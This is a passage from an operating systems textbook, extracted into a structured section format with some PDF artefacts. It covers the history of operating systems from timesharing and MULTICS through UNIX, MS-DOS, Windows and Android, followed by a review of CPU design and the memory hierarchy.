2\r\nJob 1\r\nOperating\r\nsystem\r\nMemory\r\npartitions\r\nFigure 1-5. A multiprogramming system with three jobs in memory.\r\nAnother major feature present in third-generation operating systems was the\r\nability to read jobs from cards onto the disk as soon as they were brought to the\r\ncomputer room. Then, whenever a running job finished, the operating system could\r\nload a new job from the disk into the now-empty partition and run it. This techni\u0002que is called spooling (from Simultaneous Peripheral Operation On Line) and\r\nwas also used for output. With spooling, the 1401s were no longer needed, and\r\nmuch carrying of tapes disappeared.\r\nAlthough third-generation operating systems were well suited for big scientific\r\ncalculations and massive commercial data-processing runs, they were still basically\r\nbatch systems. Many programmers pined for the first-generation days when they\r\nhad the machine all to themselves for a few hours, so they could debug their pro\u0002grams quickly. With third-generation systems, the time between submitting a job\r\nand getting back the output was often several hours, so a single misplaced comma\r\ncould cause a compilation to fail, and the programmer to waste half a day. Pro\u0002grammers did not like that very much.\r\nThis desire for quick response time paved the way for timesharing, a variant\r\nof multiprogramming, in which each user has an online terminal. In a timesharing\r\nsystem, if 20 users are logged in and 17 of them are thinking or talking or drinking\r\ncoffee, the CPU can be allocated in turn to the three jobs that want service. Since\r\npeople debugging programs usually issue short commands (e.g., compile a fiv e\u0002page procedure†) rather than long ones (e.g., sort a million-record file), the com\u0002puter can provide fast, interactive service to a number of users and perhaps also\r\nwork on big batch jobs in the background when the CPU is otherwise idle. The\r\nfirst general-purpose timesharing system, CTSS (Compatible Time Sharing Sys\u0002tem), was developed at M.I.T. on a specially modified 7094 (Corbato´ et al., 1962).\r\nHowever, timesharing did not really become popular until the necessary protection\r\nhardware became widespread during the third generation.\r\nAfter the success of the CTSS system, M.I.T., Bell Labs, and General Electric\r\n(at that time a major computer manufacturer) decided to embark on the develop\u0002ment of a ‘‘computer utility,’’ that is, a machine that would support some hundreds\r\n†We will use the terms ‘‘procedure,’’ ‘‘subroutine,’’ and ‘‘function’’ interchangeably in this book.\nSEC. 1.2 HISTORY OF OPERATING SYSTEMS 13\r\nof simultaneous timesharing users. Their model was the electricity system—when\r\nyou need electric power, you just stick a plug in the wall, and within reason, as\r\nmuch power as you need will be there. The designers of this system, known as\r\nMULTICS (MULTiplexed Information and Computing Service), envisioned\r\none huge machine providing computing power for everyone in the Boston area.\r\nThe idea that machines 10,000 times faster than their GE-645 mainframe would be\r\nsold (for well under $1000) by the millions only 40 years later was pure science\r\nfiction. Sort of like the idea of supersonic trans-Atlantic undersea trains now.\r\nMULTICS was a mixed success. It was designed to support hundreds of users\r\non a machine only slightly more powerful than an Intel 386-based PC, although it\r\nhad much more I/O capacity. This is not quite as crazy as it sounds, since in those\r\ndays people knew how to write small, efficient programs, a skill that has subse\u0002quently been completely lost. There were many reasons that MULTICS did not\r\ntake over the world, not the least of which is that it was written in the PL/I pro\u0002gramming language, and the PL/I compiler was years late and barely worked at all\r\nwhen it finally arrived. In addition, MULTICS was enormously ambitious for its\r\ntime, much like Charles Babbage’s analytical engine in the nineteenth century.\r\nTo make a long story short, MULTICS introduced many seminal ideas into the\r\ncomputer literature, but turning it into a serious product and a major commercial\r\nsuccess was a lot harder than anyone had expected. Bell Labs dropped out of the\r\nproject, and General Electric quit the computer business altogether. Howev er,\r\nM.I.T. persisted and eventually got MULTICS working. It was ultimately sold as a\r\ncommercial product by the company (Honeywell) that bought GE’s computer busi\u0002ness and was installed by about 80 major companies and universities worldwide.\r\nWhile their numbers were small, MULTICS users were fiercely loyal. General\r\nMotors, Ford, and the U.S. National Security Agency, for example, shut down their\r\nMULTICS systems only in the late 1990s, 30 years after MULTICS was released,\r\nafter years of trying to get Honeywell to update the hardware.\r\nBy the end of the 20th century, the concept of a computer utility had fizzled\r\nout, but it may well come back in the form of cloud computing, in which rel\u0002atively small computers (including smartphones, tablets, and the like) are con\u0002nected to servers in vast and distant data centers where all the computing is done,\r\nwith the local computer just handling the user interface. The motivation here is\r\nthat most people do not want to administrate an increasingly complex and finicky\r\ncomputer system and would prefer to have that work done by a team of profession\u0002als, for example, people working for the company running the data center. E-com\u0002merce is already evolving in this direction, with various companies running emails\r\non multiprocessor servers to which simple client machines connect, very much in\r\nthe spirit of the MULTICS design.\r\nDespite its lack of commercial success, MULTICS had a huge influence on\r\nsubsequent operating systems (especially UNIX and its derivatives, FreeBSD,\r\nLinux, iOS, and Android). It is described in several papers and a book (Corbato´ et\r\nal., 1972; Corbato´ and Vyssotsky, 1965; Daley and Dennis, 1968; Organick, 1972;\n14 INTRODUCTION CHAP. 1\r\nand Saltzer, 1974). It also has an active Website, located at www.multicians.org,\r\nwith much information about the system, its designers, and its users.\r\nAnother major development during the third generation was the phenomenal\r\ngrowth of minicomputers, starting with the DEC PDP-1 in 1961. The PDP-1 had\r\nonly 4K of 18-bit words, but at $120,000 per machine (less than 5% of the price of\r\na 7094), it sold like hotcakes. For certain kinds of nonnumerical work, it was al\u0002most as fast as the 7094 and gav e birth to a whole new industry. It was quickly fol\u0002lowed by a series of other PDPs (unlike IBM’s family, all incompatible) culminat\u0002ing in the PDP-11.\r\nOne of the computer scientists at Bell Labs who had worked on the MULTICS\r\nproject, Ken Thompson, subsequently found a small PDP-7 minicomputer that no\r\none was using and set out to write a stripped-down, one-user version of MULTICS.\r\nThis work later developed into the UNIX operating system, which became popular\r\nin the academic world, with government agencies, and with many companies.\r\nThe history of UNIX has been told elsewhere (e.g., Salus, 1994). Part of that\r\nstory will be given in Chap. 10. For now, suffice it to say that because the source\r\ncode was widely available, various organizations developed their own (incompati\u0002ble) versions, which led to chaos. Two major versions developed, System V, from\r\nAT&T, and BSD (Berkeley Software Distribution) from the University of Cali\u0002fornia at Berkeley. These had minor variants as well. To make it possible to write\r\nprograms that could run on any UNIX system, IEEE developed a standard for\r\nUNIX, called POSIX, that most versions of UNIX now support. POSIX defines a\r\nminimal system-call interface that conformant UNIX systems must support. In\r\nfact, some other operating systems now also support the POSIX interface.\r\nAs an aside, it is worth mentioning that in 1987, the author released a small\r\nclone of UNIX, called MINIX, for educational purposes. Functionally, MINIX is\r\nvery similar to UNIX, including POSIX support. Since that time, the original ver\u0002sion has evolved into MINIX 3, which is highly modular and focused on very high\r\nreliability. It has the ability to detect and replace faulty or even crashed modules\r\n(such as I/O device drivers) on the fly without a reboot and without disturbing run\u0002ning programs. Its focus is on providing very high dependability and availability.\r\nA book describing its internal operation and listing the source code in an appendix\r\nis also available (Tanenbaum and Woodhull, 2006). The MINIX 3 system is avail\u0002able for free (including all the source code) over the Internet at www.minix3.org.\r\nThe desire for a free production (as opposed to educational) version of MINIX\r\nled a Finnish student, Linus Torvalds, to write Linux. This system was directly\r\ninspired by and developed on MINIX and originally supported various MINIX fea\u0002tures (e.g., the MINIX file system). It has since been extended in many ways by\r\nmany people but still retains some underlying structure common to MINIX and to\r\nUNIX. Readers interested in a detailed history of Linux and the open source\r\nmovement might want to read Glyn Moody’s (2001) book. Most of what will be\r\nsaid about UNIX in this book thus applies to System V, MINIX, Linux, and other\r\nversions and clones of UNIX as well.\nSEC. 1.2 HISTORY OF OPERATING SYSTEMS 15"
          },
          "1.2.4 The Fourth Generation (1980–Present): Personal Computers": {
            "page": 46,
            "content": "1.2.4 The Fourth Generation (1980–Present): Personal Computers\r\nWith the development of LSI (Large Scale Integration) circuits—chips con\u0002taining thousands of transistors on a square centimeter of silicon—the age of the\r\npersonal computer dawned. In terms of architecture, personal computers (initially\r\ncalled microcomputers) were not all that different from minicomputers of the\r\nPDP-11 class, but in terms of price they certainly were different. Where the\r\nminicomputer made it possible for a department in a company or university to have\r\nits own computer, the microprocessor chip made it possible for a single individual\r\nto have his or her own personal computer.\r\nIn 1974, when Intel came out with the 8080, the first general-purpose 8-bit\r\nCPU, it wanted an operating system for the 8080, in part to be able to test it. Intel\r\nasked one of its consultants, Gary Kildall, to write one. Kildall and a friend first\r\nbuilt a controller for the newly released Shugart Associates 8-inch floppy disk and\r\nhooked the floppy disk up to the 8080, thus producing the first microcomputer with\r\na disk. Kildall then wrote a disk-based operating system called CP/M (Control\r\nProgram for Microcomputers) for it. Since Intel did not think that disk-based\r\nmicrocomputers had much of a future, when Kildall asked for the rights to CP/M,\r\nIntel granted his request. Kildall then formed a company, Digital Research, to fur\u0002ther develop and sell CP/M.\r\nIn 1977, Digital Research rewrote CP/M to make it suitable for running on the\r\nmany microcomputers using the 8080, Zilog Z80, and other CPU chips. Many ap\u0002plication programs were written to run on CP/M, allowing it to completely domi\u0002nate the world of microcomputing for about 5 years.\r\nIn the early 1980s, IBM designed the IBM PC and looked around for software\r\nto run on it. People from IBM contacted Bill Gates to license his BASIC inter\u0002preter. They also asked him if he knew of an operating system to run on the PC.\r\nGates suggested that IBM contact Digital Research, then the world’s dominant op\u0002erating systems company. Making what was surely the worst business decision in\r\nrecorded history, Kildall refused to meet with IBM, sending a subordinate instead.\r\nTo make matters even worse, his lawyer even refused to sign IBM’s nondisclosure\r\nagreement covering the not-yet-announced PC. Consequently, IBM went back to\r\nGates asking if he could provide them with an operating system.\r\nWhen IBM came back, Gates realized that a local computer manufacturer,\r\nSeattle Computer Products, had a suitable operating system, DOS (Disk Operat\u0002ing System). He approached them and asked to buy it (allegedly for $75,000),\r\nwhich they readily accepted. Gates then offered IBM a DOS/BASIC package,\r\nwhich IBM accepted. IBM wanted certain modifications, so Gates hired the per\u0002son who wrote DOS, Tim Paterson, as an employee of Gates’ fledgling company,\r\nMicrosoft, to make them. The revised system was renamed MS-DOS (MicroSoft\r\nDisk Operating System) and quickly came to dominate the IBM PC market. A\r\nkey factor here was Gates’ (in retrospect, extremely wise) decision to sell MS-DOS\r\nto computer companies for bundling with their hardware, compared to Kildall’s\n16 INTRODUCTION CHAP. 1\r\nattempt to sell CP/M to end users one at a time (at least initially). After all this\r\ntranspired, Kildall died suddenly and unexpectedly from causes that have not been\r\nfully disclosed.\r\nBy the time the successor to the IBM PC, the IBM PC/AT, came out in 1983\r\nwith the Intel 80286 CPU, MS-DOS was firmly entrenched and CP/M was on its\r\nlast legs. MS-DOS was later widely used on the 80386 and 80486. Although the\r\ninitial version of MS-DOS was fairly primitive, subsequent versions included more\r\nadvanced features, including many taken from UNIX. (Microsoft was well aware\r\nof UNIX, even selling a microcomputer version of it called XENIX during the\r\ncompany’s early years.)\r\nCP/M, MS-DOS, and other operating systems for early microcomputers were\r\nall based on users typing in commands from the keyboard. That eventually chang\u0002ed due to research done by Doug Engelbart at Stanford Research Institute in the\r\n1960s. Engelbart invented the Graphical User Interface, complete with windows,\r\nicons, menus, and mouse. These ideas were adopted by researchers at Xerox PARC\r\nand incorporated into machines they built.\r\nOne day, Steve Jobs, who co-invented the Apple computer in his garage, vis\u0002ited PARC, saw a GUI, and instantly realized its potential value, something Xerox\r\nmanagement famously did not. This strategic blunder of gargantuan proportions\r\nled to a book entitled Fumbling the Future (Smith and Alexander, 1988). Jobs then\r\nembarked on building an Apple with a GUI. This project led to the Lisa, which\r\nwas too expensive and failed commercially. Jobs’ second attempt, the Apple Mac\u0002intosh, was a huge success, not only because it was much cheaper than the Lisa,\r\nbut also because it was user friendly, meaning that it was intended for users who\r\nnot only knew nothing about computers but furthermore had absolutely no inten\u0002tion whatsoever of learning. In the creative world of graphic design, professional\r\ndigital photography, and professional digital video production, Macintoshes are\r\nvery widely used and their users are very enthusiastic about them. In 1999, Apple\r\nadopted a kernel derived from Carnegie Mellon University’s Mach microkernel\r\nwhich was originally developed to replace the kernel of BSD UNIX. Thus, Mac\r\nOS X is a UNIX-based operating system, albeit with a very distinctive interface.\r\nWhen Microsoft decided to build a successor to MS-DOS, it was strongly\r\ninfluenced by the success of the Macintosh. It produced a GUI-based system call\u0002ed Windows, which originally ran on top of MS-DOS (i.e., it was more like a shell\r\nthan a true operating system). For about 10 years, from 1985 to 1995, Windows\r\nwas just a graphical environment on top of MS-DOS. However, starting in 1995 a\r\nfreestanding version, Windows 95, was released that incorporated many operating\r\nsystem features into it, using the underlying MS-DOS system only for booting and\r\nrunning old MS-DOS programs. In 1998, a slightly modified version of this sys\u0002tem, called Windows 98 was released. Nevertheless, both Windows 95 and Win\u0002dows 98 still contained a large amount of 16-bit Intel assembly language.\r\nAnother Microsoft operating system, Windows NT (where the NT stands for\r\nNew Technology), which was compatible with Windows 95 at a certain level, but a\nSEC. 1.2 HISTORY OF OPERATING SYSTEMS 17\r\ncomplete rewrite from scratch internally. It was a full 32-bit system. The lead de\u0002signer for Windows NT was David Cutler, who was also one of the designers of the\r\nVAX VMS operating system, so some ideas from VMS are present in NT. In fact,\r\nso many ideas from VMS were present in it that the owner of VMS, DEC, sued\r\nMicrosoft. The case was settled out of court for an amount of money requiring\r\nmany digits to express. Microsoft expected that the first version of NT would kill\r\noff MS-DOS and all other versions of Windows since it was a vastly superior sys\u0002tem, but it fizzled. Only with Windows NT 4.0 did it finally catch on in a big way,\r\nespecially on corporate networks. Version 5 of Windows NT was renamed Win\u0002dows 2000 in early 1999. It was intended to be the successor to both Windows 98\r\nand Windows NT 4.0.\r\nThat did not quite work out either, so Microsoft came out with yet another ver\u0002sion of Windows 98 called Windows Me (Millennium Edition). In 2001, a\r\nslightly upgraded version of Windows 2000, called Windows XP was released.\r\nThat version had a much longer run (6 years), basically replacing all previous ver\u0002sions of Windows.\r\nStill the spawning of versions continued unabated. After Windows 2000,\r\nMicrosoft broke up the Windows family into a client and a server line. The client\r\nline was based on XP and its successors, while the server line included Windows\r\nServer 2003 and Windows 2008. A third line, for the embedded world, appeared a\r\nlittle later. All of these versions of Windows forked off their variations in the form\r\nof service packs. It was enough to drive some administrators (and writers of oper\u0002ating systems textbooks) balmy.\r\nThen in January 2007, Microsoft finally released the successor to Windows\r\nXP, called Vista. It came with a new graphical interface, improved security, and\r\nmany new or upgraded user programs. Microsoft hoped it would replace Windows\r\nXP completely, but it never did. Instead, it received much criticism and a bad press,\r\nmostly due to the high system requirements, restrictive licensing terms, and sup\u0002port for Digital Rights Management, techniques that made it harder for users to\r\ncopy protected material.\r\nWith the arrival of Windows 7, a new and much less resource hungry version\r\nof the operating system, many people decided to skip Vista altogether. Windows 7\r\ndid not introduce too many new features, but it was relatively small and quite sta\u0002ble. In less than three weeks, Windows 7 had obtained more market share than\r\nVista in seven months. In 2012, Microsoft launched its successor, Windows 8, an\r\noperating system with a completely new look and feel, geared for touch screens.\r\nThe company hopes that the new design will become the dominant operating sys\u0002tem on a much wider variety of devices: desktops, laptops, notebooks, tablets,\r\nphones, and home theater PCs. So far, howev er, the market penetration is slow\r\ncompared to Windows 7.\r\nThe other major contender in the personal computer world is UNIX (and its\r\nvarious derivatives). UNIX is strongest on network and enterprise servers but is\r\nalso often present on desktop computers, notebooks, tablets, and smartphones. On\n18 INTRODUCTION CHAP. 1\r\nx86-based computers, Linux is becoming a popular alternative to Windows for stu\u0002dents and increasingly many corporate users.\r\nAs an aside, throughout this book we will use the term x86 to refer to all mod\u0002ern processors based on the family of instruction-set architectures that started with\r\nthe 8086 in the 1970s. There are many such processors, manufactured by com\u0002panies like AMD and Intel, and under the hood they often differ considerably:\r\nprocessors may be 32 bits or 64 bits with few or many cores and pipelines that may\r\nbe deep or shallow, and so on. Nevertheless, to the programmer, they all look quite\r\nsimilar and they can all still run 8086 code that was written 35 years ago. Where\r\nthe difference is important, we will refer to explicit models instead—and use\r\nx86-32 and x86-64 to indicate 32-bit and 64-bit variants.\r\nFreeBSD is also a popular UNIX derivative, originating from the BSD project\r\nat Berkeley. All modern Macintosh computers run a modified version of FreeBSD\r\n(OS X). UNIX is also standard on workstations powered by high-performance\r\nRISC chips. Its derivatives are widely used on mobile devices, such as those run\u0002ning iOS 7 or Android.\r\nMany UNIX users, especially experienced programmers, prefer a command\u0002based interface to a GUI, so nearly all UNIX systems support a windowing system\r\ncalled the X Window System (also known as X11) produced at M.I.T. This sys\u0002tem handles the basic window management, allowing users to create, delete, move,\r\nand resize windows using a mouse. Often a complete GUI, such as Gnome or\r\nKDE, is available to run on top of X11, giving UNIX a look and feel something\r\nlike the Macintosh or Microsoft Windows, for those UNIX users who want such a\r\nthing.\r\nAn interesting development that began taking place during the mid-1980s is\r\nthe growth of networks of personal computers running network operating sys\u0002tems and distributed operating systems (Tanenbaum and Van Steen, 2007). In a\r\nnetwork operating system, the users are aware of the existence of multiple com\u0002puters and can log in to remote machines and copy files from one machine to an\u0002other. Each machine runs its own local operating system and has its own local user\r\n(or users).\r\nNetwork operating systems are not fundamentally different from single-proc\u0002essor operating systems. They obviously need a network interface controller and\r\nsome low-level software to drive it, as well as programs to achieve remote login\r\nand remote file access, but these additions do not change the essential structure of\r\nthe operating system.\r\nA distributed operating system, in contrast, is one that appears to its users as a\r\ntraditional uniprocessor system, even though it is actually composed of multiple\r\nprocessors. The users should not be aware of where their programs are being run or\r\nwhere their files are located; that should all be handled automatically and ef\u0002ficiently by the operating system.\r\nTrue distributed operating systems require more than just adding a little code\r\nto a uniprocessor operating system, because distributed and centralized systems\nSEC. 1.2 HISTORY OF OPERATING SYSTEMS 19\r\ndiffer in certain critical ways. Distributed systems, for example, often allow appli\u0002cations to run on several processors at the same time, thus requiring more complex\r\nprocessor scheduling algorithms in order to optimize the amount of parallelism.\r\nCommunication delays within the network often mean that these (and other)\r\nalgorithms must run with incomplete, outdated, or even incorrect information. This\r\nsituation differs radically from that in a single-processor system in which the oper\u0002ating system has complete information about the system state."
          },
          "1.2.5 The Fifth Generation (1990–Present): Mobile Computers": {
            "page": 50,
            "content": "1.2.5 The Fifth Generation (1990–Present): Mobile Computers\r\nEver since detective Dick Tracy started talking to his ‘‘two-way radio wrist\r\nwatch’’ in the 1940s comic strip, people have craved a communication device they\r\ncould carry around wherever they went. The first real mobile phone appeared in\r\n1946 and weighed some 40 kilos. You could take it wherever you went as long as\r\nyou had a car in which to carry it.\r\nThe first true handheld phone appeared in the 1970s and, at roughly one kilo\u0002gram, was positively featherweight. It was affectionately known as ‘‘the brick.’’\r\nPretty soon everybody wanted one. Today, mobile phone penetration is close to\r\n90% of the global population. We can make calls not just with our portable phones\r\nand wrist watches, but soon with eyeglasses and other wearable items. Moreover,\r\nthe phone part is no longer that interesting. We receive email, surf the Web, text\r\nour friends, play games, navigate around heavy traffic—and do not even think\r\ntwice about it.\r\nWhile the idea of combining telephony and computing in a phone-like device\r\nhas been around since the 1970s also, the first real smartphone did not appear until\r\nthe mid-1990s when Nokia released the N9000, which literally combined two,\r\nmostly separate devices: a phone and a PDA (Personal Digital Assistant). In 1997,\r\nEricsson coined the term smartphone for its GS88 ‘‘Penelope.’’\r\nNow that smartphones have become ubiquitous, the competition between the\r\nvarious operating systems is fierce and the outcome is even less clear than in the\r\nPC world. At the time of writing, Google’s Android is the dominant operating sys\u0002tem with Apple’s iOS a clear second, but this was not always the case and all may\r\nbe different again in just a few years. If anything is clear in the world of smart\u0002phones, it is that it is not easy to stay king of the mountain for long.\r\nAfter all, most smartphones in the first decade after their inception were run\u0002ning Symbian OS. It was the operating system of choice for popular brands like\r\nSamsung, Sony Ericsson, Motorola, and especially Nokia. However, other operat\u0002ing systems like RIM’s Blackberry OS (introduced for smartphones in 2002) and\r\nApple’s iOS (released for the first iPhone in 2007) started eating into Symbian’s\r\nmarket share. Many expected that RIM would dominate the business market, while\r\niOS would be the king of the consumer devices. Symbian’s market share plum\u0002meted. In 2011, Nokia ditched Symbian and announced it would focus on Win\u0002dows Phone as its primary platform. For some time, Apple and RIM were the toast\n20 INTRODUCTION CHAP. 1\r\nof the town (although not nearly as dominant as Symbian had been), but it did not\r\ntake very long for Android, a Linux-based operating system released by Google in\r\n2008, to overtake all its rivals.\r\nFor phone manufacturers, Android had the advantage that it was open source\r\nand available under a permissive license. As a result, they could tinker with it and\r\nadapt it to their own hardware with ease. Also, it has a huge community of devel\u0002opers writing apps, mostly in the familiar Java programming language. Even so,\r\nthe past years have shown that the dominance may not last, and Android’s competi\u0002tors are eager to claw back some of its market share. We will look at Android in\r\ndetail in Sec. 10.8."
          }
        }
      },
      "1.3 COMPUTER HARDWARE REVIEW": {
        "page": 51,
        "children": {
          "1.3.1 Processors": {
            "page": 52,
            "content": "1.3.1 Processors\r\nThe ‘‘brain’’ of the computer is the CPU. It fetches instructions from memory\r\nand executes them. The basic cycle of every CPU is to fetch the first instruction\r\nfrom memory, decode it to determine its type and operands, execute it, and then\r\nfetch, decode, and execute subsequent instructions. The cycle is repeated until the\r\nprogram finishes. In this way, programs are carried out.\r\nEach CPU has a specific set of instructions that it can execute. Thus an x86\r\nprocessor cannot execute ARM programs and an ARM processor cannot execute\r\nx86 programs. Because accessing memory to get an instruction or data word takes\r\nmuch longer than executing an instruction, all CPUs contain some registers inside\r\nto hold key variables and temporary results. Thus the instruction set generally con\u0002tains instructions to load a word from memory into a register, and store a word\r\nfrom a register into memory. Other instructions combine two operands from regis\u0002ters, memory, or both into a result, such as adding two words and storing the result\r\nin a register or in memory.\r\nIn addition to the general registers used to hold variables and temporary re\u0002sults, most computers have sev eral special registers that are visible to the pro\u0002grammer. One of these is the program counter, which contains the memory ad\u0002dress of the next instruction to be fetched. After that instruction has been fetched,\r\nthe program counter is updated to point to its successor.\r\nAnother register is the stack pointer, which points to the top of the current\r\nstack in memory. The stack contains one frame for each procedure that has been\r\nentered but not yet exited. A procedure’s stack frame holds those input parameters,\r\nlocal variables, and temporary variables that are not kept in registers.\r\nYet another register is the PSW (Program Status Word). This register con\u0002tains the condition code bits, which are set by comparison instructions, the CPU\r\npriority, the mode (user or kernel), and various other control bits. User programs\r\nmay normally read the entire PSW but typically may write only some of its fields.\r\nThe PSW plays an important role in system calls and I/O.\r\nThe operating system must be fully aware of all the registers. When time mul\u0002tiplexing the CPU, the operating system will often stop the running program to\r\n(re)start another one. Every time it stops a running program, the operating system\r\nmust save all the registers so they can be restored when the program runs later.\r\nTo improve performance, CPU designers have long abandoned the simple\r\nmodel of fetching, decoding, and executing one instruction at a time. Many modern\r\nCPUs have facilities for executing more than one instruction at the same time. For\r\nexample, a CPU might have separate fetch, decode, and execute units, so that while\r\nit is executing instruction n, it could also be decoding instruction n + 1 and fetch\u0002ing instruction n + 2. Such an organization is called a pipeline and is illustrated in\r\nFig. 1-7(a) for a pipeline with three stages. Longer pipelines are common. In most\r\npipeline designs, once an instruction has been fetched into the pipeline, it must be\r\nexecuted, even if the preceding instruction was a conditional branch that was taken.\n22 INTRODUCTION CHAP. 1\r\nPipelines cause compiler writers and operating system writers great headaches be\u0002cause they expose the complexities of the underlying machine to them and they\r\nhave to deal with them.\r\nFetch\r\nunit\r\nFetch\r\nunit\r\nFetch\r\nunit\r\nDecode\r\nunit\r\nDecode\r\nunit\r\nExecute\r\nunit\r\nExecute\r\nunit\r\nExecute\r\nunit\r\nExecute\r\nunit\r\nDecode\r\nunit\r\nHolding\r\nbuffer\r\n(a) (b)\r\nFigure 1-7. (a) A three-stage pipeline. (b) A superscalar CPU.\r\nEven more advanced than a pipeline design is a superscalar CPU, shown in\r\nFig. 1-7(b). In this design, multiple execution units are present, for example, one\r\nfor integer arithmetic, one for floating-point arithmetic, and one for Boolean opera\u0002tions. Two or more instructions are fetched at once, decoded, and dumped into a\r\nholding buffer until they can be executed. As soon as an execution unit becomes\r\navailable, it looks in the holding buffer to see if there is an instruction it can hand\u0002le, and if so, it removes the instruction from the buffer and executes it. An implica\u0002tion of this design is that program instructions are often executed out of order. For\r\nthe most part, it is up to the hardware to make sure the result produced is the same\r\none a sequential implementation would have produced, but an annoying amount of\r\nthe complexity is foisted onto the operating system, as we shall see.\r\nMost CPUs, except very simple ones used in embedded systems, have two\r\nmodes, kernel mode and user mode, as mentioned earlier. Usually, a bit in the PSW\r\ncontrols the mode. When running in kernel mode, the CPU can execute every in\u0002struction in its instruction set and use every feature of the hardware. On desktop\r\nand server machines, the operating system normally runs in kernel mode, giving it\r\naccess to the complete hardware. On most embedded systems, a small piece runs\r\nin kernel mode, with the rest of the operating system running in user mode.\r\nUser programs always run in user mode, which permits only a subset of the in\u0002structions to be executed and a subset of the features to be accessed. Generally, all\r\ninstructions involving I/O and memory protection are disallowed in user mode.\r\nSetting the PSW mode bit to enter kernel mode is also forbidden, of course.\r\nTo obtain services from the operating system, a user program must make a sys\u0002tem call, which traps into the kernel and invokes the operating system. The TRAP\r\ninstruction switches from user mode to kernel mode and starts the operating sys\u0002tem. When the work has been completed, control is returned to the user program at\r\nthe instruction following the system call. We will explain the details of the system\r\ncall mechanism later in this chapter. For the time being, think of it as a special kind\nSEC. 1.3 COMPUTER HARDWARE REVIEW 23\r\nof procedure call that has the additional property of switching from user mode to\r\nkernel mode. As a note on typography, we will use the lower-case Helvetica font\r\nto indicate system calls in running text, like this: read.\r\nIt is worth noting that computers have traps other than the instruction for ex\u0002ecuting a system call. Most of the other traps are caused by the hardware to warn\r\nof an exceptional situation such as an attempt to divide by 0 or a floating-point\r\nunderflow. In all cases the operating system gets control and must decide what to\r\ndo. Sometimes the program must be terminated with an error. Other times the\r\nerror can be ignored (an underflowed number can be set to 0). Finally, when the\r\nprogram has announced in advance that it wants to handle certain kinds of condi\u0002tions, control can be passed back to the program to let it deal with the problem.\r\nMultithreaded and Multicore Chips\r\nMoore’s law states that the number of transistors on a chip doubles every 18\r\nmonths. This ‘‘law’’ is not some kind of law of physics, like conservation of mo\u0002mentum, but is an observation by Intel cofounder Gordon Moore of how fast proc\u0002ess engineers at the semiconductor companies are able to shrink their transistors.\r\nMoore’s law has held for over three decades now and is expected to hold for at\r\nleast one more. After that, the number of atoms per transistor will become too\r\nsmall and quantum mechanics will start to play a big role, preventing further\r\nshrinkage of transistor sizes.\r\nThe abundance of transistors is leading to a problem: what to do with all of\r\nthem? We saw one approach above: superscalar architectures, with multiple func\u0002tional units. But as the number of transistors increases, even more is possible. One\r\nobvious thing to do is put bigger caches on the CPU chip. That is definitely hap\u0002pening, but eventually the point of diminishing returns will be reached.\r\nThe obvious next step is to replicate not only the functional units, but also\r\nsome of the control logic. The Intel Pentium 4 introduced this property, called\r\nmultithreading or hyperthreading (Intel’s name for it), to the x86 processor, and\r\nseveral other CPU chips also have it—including the SPARC, the Power5, the Intel\r\nXeon, and the Intel Core family. To a first approximation, what it does is allow the\r\nCPU to hold the state of two different threads and then switch back and forth on a\r\nnanosecond time scale. (A thread is a kind of lightweight process, which, in turn,\r\nis a running program; we will get into the details in Chap. 2.) For example, if one\r\nof the processes needs to read a word from memory (which takes many clock\r\ncycles), a multithreaded CPU can just switch to another thread. Multithreading\r\ndoes not offer true parallelism. Only one process at a time is running, but\r\nthread-switching time is reduced to the order of a nanosecond.\r\nMultithreading has implications for the operating system because each thread\r\nappears to the operating system as a separate CPU. Consider a system with two\r\nactual CPUs, each with two threads. The operating system will see this as four\r\nCPUs. If there is only enough work to keep two CPUs busy at a certain point in\n24 INTRODUCTION CHAP. 1\r\ntime, it may inadvertently schedule two threads on the same CPU, with the other\r\nCPU completely idle. This choice is far less efficient than using one thread on each\r\nCPU.\r\nBeyond multithreading, many CPU chips now hav e four, eight, or more com\u0002plete processors or cores on them. The multicore chips of Fig. 1-8 effectively carry\r\nfour minichips on them, each with its own independent CPU. (The caches will be\r\nexplained below.) Some processors, like Intel Xeon Phi and the Tilera TilePro, al\u0002ready sport more than 60 cores on a single chip. Making use of such a multicore\r\nchip will definitely require a multiprocessor operating system.\r\nIncidentally, in terms of sheer numbers, nothing beats a modern GPU (Graph\u0002ics Processing Unit). A GPU is a processor with, literally, thousands of tiny cores.\r\nThey are very good for many small computations done in parallel, like rendering\r\npolygons in graphics applications. They are not so good at serial tasks. They are\r\nalso hard to program. While GPUs can be useful for operating systems (e.g., en\u0002cryption or processing of network traffic), it is not likely that much of the operating\r\nsystem itself will run on the GPUs.\r\nL2 L2\r\nL2 L2\r\nL2 cache\r\nL1\r\ncache\r\n(a) (b)\r\nCore 1 Core 2\r\nCore 3 Core 4\r\nCore 1 Core 2\r\nCore 3 Core 4\r\nFigure 1-8. (a) A quad-core chip with a shared L2 cache. (b) A quad-core chip\r\nwith separate L2 caches."
          },
          "1.3.2 Memory": {
            "page": 55,
            "content": "1.3.2 Memory\r\nThe second major component in any computer is the memory. Ideally, a memo\u0002ry should be extremely fast (faster than executing an instruction so that the CPU is\r\nnot held up by the memory), abundantly large, and dirt cheap. No current technol\u0002ogy satisfies all of these goals, so a different approach is taken. The memory sys\u0002tem is constructed as a hierarchy of layers, as shown in Fig. 1-9. The top layers\r\nhave higher speed, smaller capacity, and greater cost per bit than the lower ones,\r\noften by factors of a billion or more.\r\nThe top layer consists of the registers internal to the CPU. They are made of\r\nthe same material as the CPU and are thus just as fast as the CPU. Consequently,\r\nthere is no delay in accessing them. The storage capacity available in them is\nSEC. 1.3 COMPUTER HARDWARE REVIEW 25\r\nRegisters\r\nCache\r\nMain memory\r\nMagnetic disk\r\n 1 nsec\r\n 2 nsec\r\n 10 nsec\r\n 10 msec\r\n<1 KB\r\n 4 MB\r\n 1-8 GB\r\n 1-4 TB\r\nTypical access time Typical capacity\r\nFigure 1-9. A typical memory hierarchy. The numbers are very rough approximations.\r\ntypically 32 × 32 bits on a 32-bit CPU and 64 × 64 bits on a 64-bit CPU. Less than\r\n1 KB in both cases. Programs must manage the registers (i.e., decide what to keep\r\nin them) themselves, in software.\r\nNext comes the cache memory, which is mostly controlled by the hardware.\r\nMain memory is divided up into cache lines, typically 64 bytes, with addresses 0\r\nto 63 in cache line 0, 64 to 127 in cache line 1, and so on. The most heavily used\r\ncache lines are kept in a high-speed cache located inside or very close to the CPU.\r\nWhen the program needs to read a memory word, the cache hardware checks to see\r\nif the line needed is in the cache. If it is, called a cache hit, the request is satisfied\r\nfrom the cache and no memory request is sent over the bus to the main memory.\r\nCache hits normally take about two clock cycles. Cache misses have to go to\r\nmemory, with a substantial time penalty. Cache memory is limited in size due to its\r\nhigh cost. Some machines have two or 